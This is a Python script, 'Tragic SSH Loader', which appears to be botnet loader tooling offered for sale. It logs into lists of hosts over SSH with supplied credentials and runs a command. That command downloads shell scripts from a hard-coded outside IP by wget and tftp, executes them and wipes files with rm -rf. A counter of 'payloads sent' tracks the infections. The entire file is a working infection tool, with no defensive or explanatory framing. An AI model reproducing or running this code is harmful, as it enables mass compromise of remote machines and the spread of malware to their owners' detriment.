
#!/usr/bin/python
# Tragic SSH Loader

import sys
import time
import socket
import paramiko
import warnings
import multiprocessing
from multiprocessing import Value

cmd ="cd /tmp || cd /run || cd /; wget http://178.63.253.33/axisbins.sh; chmod 777 axisbins.sh; sh axisbins.sh; tftp 178.63.253.33 -c get axistftp1.sh; chmod 777 axistftp1.sh; sh axistftp1.sh; tftp -r axistftp2.sh -g 178.63.253.33; chmod 777 axistftp2.sh; sh axistftp2.sh; rm -rf axisbins.sh axistftp1.sh axistftp2.sh; rm -rf *"

paramiko.util.log_to_file("/dev/null")
warnings.simplefilter(action="ignore", category=FutureWarning)

with open(sys.argv[1], "r") as fd:
    lines = fd.readlines()

RAN = Value('i', 0)
CONNF = Value('i', 0)
FAUTH = Value('i', 0)
CMDS = Value('i', 0)

def tragedy(creds):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(creds[2], port=22, username=creds[0], password=creds[1], timeout=5)
        stdin, stdout, stderr = ssh.exec_command(cmd)
        time.sleep(10)
        ssh.close()
        global CMDS
        with CMDS.get_lock():
            CMDS.value += 1
        global RAN
        with RAN.get_lock():
            RAN.value += 1
        print("\x1b[37m|| \x1b[1;36mRan: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPayloads Sent: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mConnFails: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mAuthFails: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m||\x1b[0m"% (RAN.value, CMDS.value, CONNF.value, FAUTH.value))
        return
    except paramiko.ssh_exception.AuthenticationException:
        global FAUTH
        with FAUTH.get_lock():
            FAUTH.value += 1
        global RAN
        with RAN.get_lock():
            RAN.value += 1
        print("\x1b[37m|| \x1b[1;36mRan: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPayloads Sent: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mConnFails: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mAuthFails: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m||\x1b[0m"% (RAN.value, CMDS.value, CONNF.value, FAUTH.value))
        return
    except socket.error:
        global CONNF
        with CONNF.get_lock():
            CONNF.value += 1
        global RAN
        with RAN.get_lock():
            RAN.value += 1
        print("\x1b[37m|| \x1b[1;36mRan: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPayloads Sent: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mConnFails: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mAuthFails: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m||\x1b[0m"% (RAN.value, CMDS.value, CONNF.value, FAUTH.value))
        return
    except:
        global CONNF
        with CONNF.get_lock():
            CONNF.value += 1
        global RAN
        with RAN.get_lock():
            RAN.value += 1
        print("\x1b[37m|| \x1b[1;36mRan: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mPayloads Sent: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mConnFails: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m|| \x1b[1;36mAuthFails: \x1b[1;31m[\x1b[1;36m%d\x1b[1;31m] \x1b[37m||\x1b[0m"% (RAN.value, CMDS.value, CONNF.value, FAUTH.value))
        pass

for line in lines:
    creds = line.strip().split(":")
    multiprocessing.Process(target=tragedy, args=(creds,)).start()

#    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
#    Sales Release 10/5/2019
#    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere. We're All Here To Make Money!
#    Much Love
#        - Tragedy[
